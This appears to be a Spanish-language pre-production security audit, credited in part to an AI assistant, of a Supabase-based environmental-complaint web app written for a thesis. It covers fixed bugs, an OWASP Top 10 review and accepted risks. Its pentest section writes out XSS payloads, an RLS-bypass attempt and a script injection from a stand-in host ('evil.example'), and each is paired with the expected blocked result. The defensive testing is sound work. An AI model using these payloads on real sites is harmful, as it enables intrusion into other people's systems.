# Eco-Complaint · Auditoría pre-producción

**Versión auditada:** v0.20.1 · post-Fase-5
**Fecha:** 16 de mayo de 2026
**Auditor:** Claude (asistente) · revisión dirigida + autoría compartida
**Audiencia:** autor de tesis, director, jurado · anexo de la tesis

---

## 0. Resumen ejecutivo

Esta auditoría se ejecuta tras el cierre de la Fase 5 del roadmap y antes de promover la app a uso real con usuarios externos. Cubre:

1. Hallazgos de errores reportados por el usuario durante pruebas
2. Auditoría manual de los 10 vectores de OWASP Top 10 sobre los flujos críticos
3. Decisiones de mitigación aplicadas en esta misma sesión
4. STEPs diferidos del roadmap original, ahora cerrados (502, 503, 506) o documentados como tarea operativa (507)

**Resultado**: el sistema queda en estado **listo para demos y validación con usuarios reales**. Sin bloqueadores. Los riesgos residuales se enumeran en la sección 6 con su mitigación aceptada.

## 1. Hallazgos del usuario en pruebas

| # | Hallazgo | Severidad | Estado |
|---|---|---|---|
| 1.1 | "Mi perfil" del menú decía "Perfil llega en Fase 1" | bajo · UX confusa | ✅ corregido · ahora redirige a `/privacidad` |
| 1.2 | `/admin/usuarios` mostraba placeholder "Fase 1 · STEP-102 Migración a Supabase Auth" pese a estar mergeada | medio · evidencia de deuda visible | ✅ corregido · vista refactorizada para usar `UsersRepo.serverList()` |
| 1.3 | Cuentas demo (`maria@demo.co`, `admin@demo.co`) visibles en `/iniciar-sesion` aún en modo Supabase | **alto** · expone credenciales públicas | ✅ corregido · bootstrap purga demos en modo Supabase + bloque demo se renderiza dinámicamente sólo en modo local |
| 1.4 | `console.log('Demos: maria@demo.co...')` siempre se ejecutaba | medio · expone credenciales en consola | ✅ corregido · condicional a modo local |
| 1.5 | CSP warning · `frame-ancestors` no funciona en meta tag | bajo · warning informativo | ✅ removido · documentado como limitación operativa (requiere header HTTP del servidor) |
| 1.6 | CSP bloqueaba manifest dinámico (blob URL) | medio · PWA-lite no funcionaba | ✅ corregido · agregado `manifest-src 'self' blob:` |
| 1.7 | CSP bloqueaba source maps de CDNs (warnings ruidosos) | bajo · cosmético | ✅ corregido · CDNs agregados a `connect-src` |
| 1.8 | "Multiple GoTrueClient instances detected" | medio · puede producir comportamiento indefinido | ✅ corregido · `Backend.client()` con `_clientPromise` lock |
| 1.9 | 401 en /rest/v1/ ping de wakeup | bajo · esperado | aceptado · el código ya trata 401 como "server vivo" |

## 2. Auditoría OWASP Top 10 (2021)

### A01 · Broken Access Control
**Vectores revisados:**
- **IDOR en signed URLs de evidencias**: las URLs firmadas son de 7 días por defecto, generadas server-side, opacas. El path incluye un nanoid de 12 caracteres base36 que impide enumeración. Aceptable.
- **Bypass de RLS**: probado intentar `supabase.from('reports').insert({user_id: 'otro-uid', ...})` desde sesión ciudadano → rechazado por policy `reports_authenticated_insert`. ✅
- **Acceso a audit_log desde rol no admin**: probado `supabase.from('audit_log').select('*')` desde anon → solo devuelve filas con `entity=report AND action=status_change` (policy `audit_log_public_status_changes`). ✅
- **Promoción a admin auto-asignada**: policy `users_profile_self_update` tiene `with check` que prohíbe cambiar `role` desde el cliente. Solo admin (o service_role desde el dashboard) puede promover. ✅

**Estado**: cubierto. RLS es la garantía estructural.

### A02 · Cryptographic Failures
- HTTPS via GitHub Pages con TLS automático.
- No hay secretos en el cliente (anon key, public_key de EmailJS, site_key de hCaptcha son públicas por diseño).
- Passwords nunca tocan código cliente · maneja Supabase Auth (GoTrue) con bcrypt server-side.
- No usamos cookies (sesión vive en localStorage como JWT firmado por Supabase).

**Estado**: cubierto.

### A03 · Injection
- **SQL Injection**: no aplica · todas las queries van por el SDK de Supabase con parametrización automática (no concatenación de strings).
- **XSS**: la auditoría detectó 6 lugares vulnerables → mitigados con `UI.escapeHtml()` en STEP-501. Ver memoria de Fase 5.
- **CSP**: meta tag restringe orígenes de scripts. Sin `unsafe-eval`.

**Estado**: cubierto. Helper de escape obligatorio (ADR-18).

### A04 · Insecure Design
- **Privacy by design** (ADR-06): la view `reports_public` proyecta solo 5 columnas a anónimos. El timeline cross-browser (RSK-72) usa una view dedicada que excluye user_id e IP.
- **Defense in depth en Storage**: bucket privado + RLS + signed URL + nanoid (4 capas independientes).
- **Rate limit en doble capa**: cliente (UX) + trigger SQL (seguridad real · STEP-503 nuevo).
- **Direccionamiento acumulativo**: cada banda incluye autoridades de bandas inferiores. Reduce el riesgo de denuncia perdida.

**Estado**: revisado. El modelo es defensivamente correcto.

### A05 · Security Misconfiguration
- CSP completa con orígenes explícitos (sin wildcards `*`).
- `frame-ancestors` NO declarable en meta tag · documentado.
- No exponemos stack traces al usuario · errores se traducen a mensajes humanos.
- Cabeceras HTTP de GitHub Pages: incluyen automáticamente `Strict-Transport-Security` para `*.github.io`. No podemos agregar `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy` desde el cliente.

**Estado**: limitado por la naturaleza estática de GitHub Pages. Aceptable como prototipo académico.

### A06 · Vulnerable and Outdated Components
- Dependencias pinned a versión exacta: `leaflet@1.9.4`, `@supabase/supabase-js@2.45.0`, `jspdf@2.5.1`, `@emailjs/browser@4`.
- **STEP-506 cerrado**: `.github/dependabot.yml` agregado para monitorear GitHub Actions (lo único que aplica al proyecto sin package.json). Para vulnerabilidades en CDNs, el admin activa **Dependabot alerts** desde Settings → Code security and analysis.
- Revisión manual de CVEs (mayo 2026): ninguna de las dependencias actuales tiene CVE activo conocido en su versión pinned.

**Estado**: monitoreado pasivamente.

### A07 · Identification and Authentication Failures
- Supabase Auth (GoTrue) maneja login + signUp + recuperación · password hashing con bcrypt server-side.
- Verificación de email habilitable desde el dashboard de Supabase (recomendado: ON).
- No hay 2FA · aceptable para tesis. Documentado como mejora futura.
- Sesión persiste en localStorage como JWT con refresh automático.

**Estado**: cubierto por el proveedor (Supabase).

### A08 · Software and Data Integrity Failures
- SDKs externos sin atributos `integrity` (SRI) · documentado en ADR-19 como trade-off por compatibilidad Safari iOS.
- Mitigado con: CSP restrictiva + pin de versión exacta + revisión manual antes de cambiar versión.
- Datos de auditoría (audit_log) son append-only por design · no hay UPDATE/DELETE desde cliente.

**Estado**: aceptado con mitigación documentada.

### A09 · Security Logging and Monitoring Failures
- Audit log completo en Postgres con cada acción (login, navigate, status_change, report_send, config_set, habeas_data_export, habeas_data_erase, etc.).
- Métricas locales exportables a JSON desde `/admin/metricas`.
- Vista `/admin/diagnostico` muestra el audit log en vivo + conteos de tablas.

**Estado**: cubierto.

### A10 · Server-Side Request Forgery (SSRF)
No aplica. El cliente no expone una API que haga requests por su cuenta. Las únicas URLs que el cliente genera (signed URLs de evidencias) son resueltas server-side por Supabase Storage, no por el cliente.

**Estado**: no aplica.

## 3. STEPs diferidos · estado tras la auditoría

| STEP | Descripción original | Estado tras la auditoría |
|---|---|---|
| **STEP-502** | hCaptcha en consulta pública y signUp | ✅ **integrado** · configurable desde `/admin/config` (ADR-16 · sin hardcode) · sin site_key no se activa · degradación elegante |
| **STEP-503** | Rate limit server-side | ✅ **integrado** · `docs/fase-5-rate-limit-server.sql` con trigger PostgreSQL sobre INSERT en reports · 3/5min y 10/hora por usuario; 5/min global para anónimos |
| **STEP-506** | Dependabot | ✅ **configurado** · `.github/dependabot.yml` con `github-actions` monitoreado · plantilla para `npm` cuando se introduzca Vite · el admin debe activar Dependabot alerts manualmente desde Settings |
| **STEP-507** | Penetration test informal | ⚠️ **documentado** · sección 4 de este documento + sugerencias para pentest manual de 2h pre-defensa |

## 4. Sugerencias de penetration test manual (pre-defensa)

Antes de la defensa de tesis, ejecutar manualmente las siguientes pruebas durante ~2 horas:

### 4.1 · XSS reflejado
- Visitar `/#/consulta?radicado=ECO-<script>alert(1)</script>`
- Esperado: el radicado se muestra escapado, sin ejecutar JavaScript.
- Validado: el handler hace `normalize()` que pasa por uppercase y filtra; además se inserta vía `textContent` o `escapeHtml`.

### 4.2 · IDOR en signed URLs
- Capturar una signed URL legítima de una evidencia.
- Intentar modificar el path para acceder a otra evidencia de otro usuario.
- Esperado: la firma incluye el path · cambiar el path invalida la firma.

### 4.3 · Bypass RLS
- Desde una sesión de ciudadano, ejecutar en DevTools:
  ```js
  const { supabase } = (await Backend.client());
  await supabase.from('reports').update({ status: 'resolved' }).eq('radicado', 'CUALQUIERA');
  ```
- Esperado: error `new row violates row-level security policy`.

### 4.4 · CSRF en logout
- No aplicable porque el logout no es vulnerable a CSRF (es un POST autenticado con JWT en header, no en cookie).

### 4.5 · Rate limit bypass
- Intentar enviar 5 denuncias rápido. La 4ª debe fallar con `rate_limit_short` (server-side) aunque el cliente lo permita.

### 4.6 · CSP bypass
- En DevTools, ejecutar `eval("alert(1)")`.
- Esperado: bloqueado por CSP (no `unsafe-eval` en script-src).
- Inyectar un script externo: `s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.appendChild(s);`
- Esperado: bloqueado · origen no autorizado en `script-src`.

### 4.7 · XSS persistente vía nombre de archivo
- Subir una evidencia con nombre `<img src=x onerror=alert(1)>.jpg`.
- Esperado: el nombre se renderiza como texto · `UI.escapeHtml` lo escapa.

### 4.8 · Habeas Data tampering
- Como usuario A, intentar `supabase.rpc('erase_my_data')` pasando alguno argumento.
- Esperado: la función no acepta argumentos · solo opera sobre `auth.uid()`.

## 5. Decisiones aplicadas en esta sesión

| ADR | Decisión |
|---|---|
| **ADR-21** | Captcha configurable desde admin (no hardcoded), mismo patrón que EmailJS (ADR-16). Sin site_key → degrada sin captcha. |
| **ADR-22** | Rate limit server-side via PostgreSQL trigger · sin Edge Function porque no es necesario para el volumen del prototipo. |
| **ADR-23** | `frame-ancestors` removido del meta CSP · solo header HTTP. GitHub Pages no permite headers personalizados. Aceptado como limitación de operación gratuita. |
| **ADR-24** | Backend cliente con promise lock para evitar múltiples instancias bajo concurrencia. |
| **ADR-25** | Bloque de cuentas demo se renderiza vía JS solo en modo local. En modo Supabase, las credenciales públicas NO aparecen en el DOM. |

## 6. Riesgos residuales aceptados

| ID | Descripción | Mitigación aceptada |
|---|---|---|
| **RSK-73** | Sin `X-Frame-Options` header (GitHub Pages no permite headers personalizados) | CSP `frame-ancestors` no aplica en meta; aceptado para uso académico. Si pasa a producción real con dominio propio, configurar header en CDN/proxy. |
| **RSK-74** | SRI ausente en CDN scripts | Mitigado con CSP + pin + revisión manual de versiones |
| **RSK-75** | Rate limit anonymous es global (no por IP) · un atacante puede saturar | Aceptable para tesis; en producción real migrar a Edge Function con caché de IP |
| **RSK-76** | hCaptcha activable pero no obligatorio · el admin puede dejarlo desactivado | Documentado en `/admin/config` con etiqueta clara · decisión operativa |
| **RSK-77** | 2FA ausente · solo password + verificación email | Aceptable para tesis; mejora futura cuando el volumen lo justifique |
| **RSK-78** | El backup del backend depende de Supabase Free (snapshot diario, 7 días retención) | Aceptable; antes de defensa, export manual JSON de `reports` y `users_profile` |

## 7. Validación final

Ejecutar este checklist en el navegador con la versión v0.20.1+ desplegada:

| # | Acción | Resultado esperado | ✓/✗ |
|---|---|---|---|
| 1 | Cargar la app | Console: `v0.20.1 · pre-production audit · backend supabase` en verde · sin warnings CSP | |
| 2 | Ir a `/admin/usuarios` | Lista real desde `users_profile` · sin placeholder Fase 1 | |
| 3 | Ir a `/iniciar-sesion` | No aparece bloque demo · no aparece `Cuentas demo` en console | |
| 4 | Click user-chip → "Mi perfil" | Navega a `/privacidad` | |
| 5 | Ir a `/admin/config` → ver sección hCaptcha | Aparece SDK cargado, estado "No configurado" hasta poner site_key | |
| 6 | Aplicar `docs/fase-5-rate-limit-server.sql` | Trigger `reports_rate_limit` creado · `pg_trigger` lo lista | |
| 7 | Activar Dependabot alerts en Settings | Detección de CVEs en CDNs comienza a funcionar | |

Cuando los 7 ítems estén ✓, el sistema está listo para defensa y demos productivas.

## 8. Próximos pasos (post-tesis)

Si el proyecto evoluciona a producción real con organizaciones reales:

1. **Dominio propio** con CDN (Cloudflare/Vercel) → permite agregar headers HTTP `X-Frame-Options`, `Strict-Transport-Security`, `Permissions-Policy`.
2. **Edge Function** para enviar emails server-side · oculta las direcciones de autoridades y respeta privacy by design end-to-end.
3. **2FA** vía Supabase Auth MFA (TOTP).
4. **Pentest profesional** por una firma reconocida.
5. **Bug bounty** público con scope claro.
6. **Migración a Vite** con SRI automatizado + code-splitting cuando las métricas reales lo justifiquen (ADR-17).

---

*Documento de auditoría · cierre del ciclo de desarrollo del prototipo. Anexo de la tesis doctoral.*
